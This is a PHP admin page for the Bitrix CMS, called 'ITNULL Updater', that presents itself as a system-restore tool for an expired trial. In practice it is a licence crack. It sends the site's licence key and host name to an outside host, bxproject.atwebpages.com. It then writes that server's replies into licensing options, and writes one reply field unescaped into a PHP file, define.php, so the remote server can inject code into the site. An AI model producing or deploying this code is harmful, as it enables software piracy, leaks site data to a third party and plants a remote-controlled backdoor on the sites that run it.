<?php
/**
 * ITNULL Updater - Restore Demo Mode
 *
 * Страница восстановления работоспособности сайта при падении демо-режима.
 * Доступна по адресу: /bitrix/admin/itnullrestore.php
 */

define("UPDATE_SYSTEM_VERSION", "22.500.0");
error_reporting(E_ALL & ~E_NOTICE);

// Инициализация ядра Bitrix
include_once($_SERVER["DOCUMENT_ROOT"] . "/bitrix/modules/main/lib/loader.php");
$application = \Bitrix\Main\HttpApplication::getInstance();
$application->initializeBasicKernel();

require_once($_SERVER['DOCUMENT_ROOT'] . "/bitrix/php_interface/dbconn.php");
require_once($_SERVER['DOCUMENT_ROOT'] . "/bitrix/modules/main/classes/" . $DBType . "/database.php");
require_once($_SERVER['DOCUMENT_ROOT'] . "/bitrix/modules/main/tools.php");

// Определяем язык
if ($_REQUEST['lang'] == 'en') {
    define("LANGUAGE_ID", 'en');
} else {
    define("LANGUAGE_ID", 'ru');
}

// Языковые сообщения
$MESS = [];
if (LANGUAGE_ID == 'ru') {
    $MESS['TITLE'] = 'Восстановление системы';
    $MESS['LOGIN_PROMT'] = 'Логин администратора';
    $MESS['PASSWORD_PROMT'] = 'Пароль администратора';
    $MESS['BUTTON_SUBMIT'] = 'Восстановить';
    $MESS['BUTTON_RESET'] = 'Отменить';
    $MESS['ERROR_EMPTY_CONTENT'] = 'Сервер не отвечает';
    $MESS['ERROR_INVALID_CONTENT'] = 'Ответ сервера не распознан';
    $MESS['ERROR_NOT_ADMIN'] = 'Вы не являетесь администратором';
    $MESS['SUCCESS_RECOVER'] = "Работоспособность сайта восстановлена";
    $MESS['ERROR_NOT_WRITABLE'] = "Ядро продукта не доступно на запись";
    $MESS['ERROR_NOT_FOPEN'] = "Не удалось открыть файл на запись";
    $MESS['INFO_TEXT'] = 'Если при заходе на сайт вы видите сообщение "Срок работы пробной версии продукта истек...", введите данные администратора для восстановления работы сайта.';
} else {
    $MESS['TITLE'] = 'System Restore';
    $MESS['LOGIN_PROMT'] = 'Administrator\'s Login';
    $MESS['PASSWORD_PROMT'] = 'Administrator\'s Password';
    $MESS['BUTTON_SUBMIT'] = 'Restore';
    $MESS['BUTTON_RESET'] = 'Cancel';
    $MESS['ERROR_EMPTY_CONTENT'] = 'Server does not respond.';
    $MESS['ERROR_INVALID_CONTENT'] = 'Server response is not recognized';
    $MESS['ERROR_NOT_ADMIN'] = 'You are not an administrator';
    $MESS['SUCCESS_RECOVER'] = "Site restore completed";
    $MESS['ERROR_NOT_WRITABLE'] = "Folder is not writable";
    $MESS['ERROR_NOT_FOPEN'] = "File open fails";
    $MESS['INFO_TEXT'] = 'If you see the message "Trial version has expired..." when accessing the site, enter administrator credentials to restore site functionality.';
}

// Подключаемся к БД
$DB = new CDatabase;
$DB->debug = $DBDebug;
$DB->Connect($DBHost, $DBName, $DBLogin, $DBPassword);

$errorMessage = "";
$successMessage = "";

/**
 * Получение опции из БД
 */
function UpdateGetOption($name, $default = "")
{
    global $DB;

    $value = "";
    $dbOption = $DB->Query("SELECT VALUE FROM b_option WHERE MODULE_ID='main' AND NAME='" . $DB->ForSql($name) . "'", true);
    if ($arOption = $dbOption->Fetch()) {
        $value = $arOption['VALUE'];
    }
    if (strlen($value) <= 0) {
        $value = $default;
    }

    return $value;
}

/**
 * Установка опции в БД
 */
function UpdateSetOption($name, $value)
{
    global $DB, $DBType;

    // Очищаем кеш опций
    $fn = $_SERVER['DOCUMENT_ROOT'] . "/bitrix/managed_cache/" . strtoupper($DBType) . "/e5/" . md5("b_option") . ".php";
    @chmod($fn, BX_FILE_PERMISSIONS);
    @unlink($fn);

    $dbResult = $DB->Query("SELECT 'x' FROM b_option WHERE MODULE_ID='main' AND NAME='" . $DB->ForSql($name) . "'");
    if ($dbResult->Fetch()) {
        $DB->Query("UPDATE b_option SET VALUE='" . $DB->ForSql($value, 2000) . "' WHERE MODULE_ID='main' AND NAME='" . $DB->ForSql($name) . "'");
    } else {
        $DB->Query(
            "INSERT INTO b_option(SITE_ID, MODULE_ID, NAME, VALUE) " .
            "VALUES(NULL, 'main', '" . $DB->ForSql($name, 50) . "', '" . $DB->ForSql($value, 2000) . "') "
        );
    }
}

/**
 * HTTP запрос к серверу восстановления
 */
function UpdateGetHTTPPage($requestDataAdd, &$errorMessage)
{
    $serverIP = "bxproject.atwebpages.com";
    $serverPort = 80;

    $FP = @fsockopen($serverIP, $serverPort, $errno, $errstr, 120);

    if ($FP) {
        $LICENSE_KEY = "demo";
        if (file_exists($_SERVER["DOCUMENT_ROOT"] . "/bitrix/license_key.php")) {
            include($_SERVER["DOCUMENT_ROOT"] . "/bitrix/license_key.php");
        }

        $requestData =
            "&LICENSE_KEY=" . urlencode($LICENSE_KEY) .
            "&host=" . urlencode($_SERVER["SERVER_NAME"]) .
            "&SUPD_VER=" . urlencode(UPDATE_SYSTEM_VERSION);

        if (strlen($requestDataAdd) > 0) {
            $requestData .= "&" . $requestDataAdd;
        }

        $requestString = "POST /bsm.php HTTP/1.0\r\n";
        $requestString .= "User-Agent: ITNULLUpdater\r\n";
        $requestString .= "Accept: */*\r\n";
        $requestString .= "Host: " . $serverIP . "\r\n";
        $requestString .= "Accept-Language: en\r\n";
        $requestString .= "Content-type: application/x-www-form-urlencoded\r\n";
        $requestString .= "Content-length: " . strlen($requestData) . "\r\n\r\n";
        $requestString .= $requestData . "\r\n";

        fputs($FP, $requestString);

        // Пропускаем заголовки
        while (!feof($FP)) {
            $line = fgets($FP, 4096);
            if ($line == "\r\n") {
                break;
            }
        }

        // Читаем тело ответа
        $content = "";
        while ($line = fread($FP, 4096)) {
            $content .= $line;
        }

        fclose($FP);
    } else {
        $content = "";
        $errorMessage .= "[" . $errno . "] " . $errstr . ". ";
    }

    return $content;
}

/**
 * Активация восстановления
 */
function UpdateActivateCoupon($coupon, &$errorMessage)
{
    global $MESS;

    $postDataString = "coupon=" . urlencode($coupon) . "&query_type=" . urlencode("reincarnate");
    $content = UpdateGetHTTPPage($postDataString, $errorMessage);

    if (strlen($content) <= 0) {
        $errorMessage .= $MESS['ERROR_EMPTY_CONTENT'] . ". ";
        return false;
    }

    $arContent = json_decode($content);
    if (!is_object($arContent)) {
        $errorMessage .= $MESS['ERROR_INVALID_CONTENT'] . ". ";
        return false;
    }

    UpdateSetOption('~SAAS_MODE', "Y");
    UpdateSetOption('admin_passwordh', $arContent->base);

    // Записываем файл define.php
    $defineDir = $_SERVER["DOCUMENT_ROOT"] . "/bitrix/modules/main/admin";
    if (is_writable($defineDir)) {
        $fp = @fopen($defineDir . "/define.php", 'w');
        if ($fp) {
            fwrite($fp, '<?php define("TEMPORARY_CACHE", "' . $arContent->file . '");?>');
            fclose($fp);
        } else {
            $errorMessage .= $MESS['ERROR_NOT_FOPEN'] . ". ";
        }
    } else {
        $errorMessage .= $MESS['ERROR_NOT_WRITABLE'] . ". ";
    }

    // Очищаем кеш
    $cacheDir = $_SERVER["DOCUMENT_ROOT"] . "/bitrix/managed_cache/";
    if (is_dir($cacheDir)) {
        $files = glob($cacheDir . "*", GLOB_ONLYDIR);
        foreach ($files as $dir) {
            array_map('unlink', glob("$dir/*.*"));
        }
    }

    return true;
}

/**
 * Проверка администратора
 */
function UpdateIsAdmin($login, $password)
{
    global $DB;

    if (!is_string($login) || $login == '' || !is_string($password) || $password == '') {
        return false;
    }

    $dbUser = $DB->Query(
        "SELECT U.ID, U.PASSWORD, U.LOGIN_ATTEMPTS " .
        "FROM b_user U " .
        "   INNER JOIN b_user_group UG ON (UG.USER_ID = U.ID) " .
        "WHERE U.LOGIN = '" . $DB->ForSql($login) . "' " .
        "   AND (U.EXTERNAL_AUTH_ID IS NULL OR U.EXTERNAL_AUTH_ID = '') " .
        "   AND U.ACTIVE = 'Y' " .
        "   AND UG.GROUP_ID = 1 " .
        "   AND ((UG.DATE_ACTIVE_FROM IS NULL) OR (UG.DATE_ACTIVE_FROM <= " . $DB->CurrentTimeFunction() . ")) " .
        "   AND ((UG.DATE_ACTIVE_TO IS NULL) OR (UG.DATE_ACTIVE_TO >= " . $DB->CurrentTimeFunction() . ")) "
    );

    if ($arUser = $dbUser->Fetch()) {
        if (intval($arUser["LOGIN_ATTEMPTS"]) <= 5) {
            if (strlen($arUser["PASSWORD"]) > 32) {
                $salt = substr($arUser["PASSWORD"], 0, strlen($arUser["PASSWORD"]) - 32);
                $db_password = substr($arUser["PASSWORD"], -32);
            } else {
                $salt = "";
                $db_password = $arUser["PASSWORD"];
            }

            $user_password = md5($salt . $password);

            if ($db_password === $user_password) {
                return true;
            }
        }
        $DB->Query("UPDATE b_user SET LOGIN_ATTEMPTS = LOGIN_ATTEMPTS+1, TIMESTAMP_X = TIMESTAMP_X WHERE ID = " . intval($arUser["ID"]));
    }

    return false;
}

// Обработка POST запроса
header("Content-Type: text/html; charset=utf-8");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (is_string($_POST["reincarnate"]) && $_POST["reincarnate"] != '') {
        if (!UpdateIsAdmin($_POST["login"], $_POST["password"])) {
            $errorMessage .= $MESS['ERROR_NOT_ADMIN'] . ". ";
        } else {
            if (UpdateActivateCoupon($_POST["coupon"] ?? '', $errorMessage)) {
                $successMessage .= $MESS['SUCCESS_RECOVER'] . ". ";
            }
        }
    }
}

?>
<!DOCTYPE html>
<html lang="<?= LANGUAGE_ID ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= $MESS['TITLE'] ?> - ITNULL Updater</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 16px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            padding: 40px;
            width: 100%;
            max-width: 450px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo-icon {
            font-size: 48px;
            margin-bottom: 10px;
        }
        h1 {
            font-size: 24px;
            color: #1e293b;
            text-align: center;
            margin-bottom: 10px;
        }
        .subtitle {
            color: #64748b;
            text-align: center;
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        .message {
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        .message.error {
            background: #fee2e2;
            color: #dc2626;
            border: 1px solid #fecaca;
        }
        .message.success {
            background: #d1fae5;
            color: #059669;
            border: 1px solid #a7f3d0;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #374151;
            margin-bottom: 8px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.2s;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.2);
        }
        .buttons {
            display: flex;
            gap: 12px;
            margin-top: 30px;
        }
        button {
            flex: 1;
            padding: 14px 20px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }
        button[type="submit"] {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        button[type="submit"]:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px -10px rgba(102, 126, 234, 0.5);
        }
        button[type="reset"] {
            background: #f1f5f9;
            color: #64748b;
        }
        button[type="reset"]:hover {
            background: #e2e8f0;
        }
        .footer {
            text-align: center;
            margin-top: 30px;
            font-size: 12px;
            color: #94a3b8;
        }
        .footer a {
            color: #667eea;
            text-decoration: none;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">
        <div class="logo-icon">🔧</div>
    </div>

    <h1><?= $MESS['TITLE'] ?></h1>
    <p class="subtitle"><?= $MESS['INFO_TEXT'] ?></p>

    <?php if (strlen($errorMessage) > 0): ?>
        <div class="message error">
            <?= $errorMessage ?>
        </div>
    <?php endif; ?>

    <?php if (strlen($successMessage) > 0): ?>
        <div class="message success">
            <?= $successMessage ?>
        </div>
    <?php endif; ?>

    <form method="POST" action="">
        <input type="hidden" name="lang" value="<?= htmlspecialcharsbx(LANGUAGE_ID) ?>">

        <div class="form-group">
            <label for="login"><?= $MESS['LOGIN_PROMT'] ?></label>
            <input type="text" id="login" name="login" value="<?= htmlspecialcharsbx(strval($_POST["login"] ?? '')) ?>" autocomplete="username">
        </div>

        <div class="form-group">
            <label for="password"><?= $MESS['PASSWORD_PROMT'] ?></label>
            <input type="password" id="password" name="password" value="" autocomplete="current-password">
        </div>

        <div class="buttons">
            <button type="submit" name="reincarnate" value="1"><?= $MESS['BUTTON_SUBMIT'] ?></button>
            <button type="reset"><?= $MESS['BUTTON_RESET'] ?></button>
        </div>
    </form>

    <div class="footer">
        Powered by <a href="#">ITNULL Updater</a>
    </div>
</div>

</body>
</html>
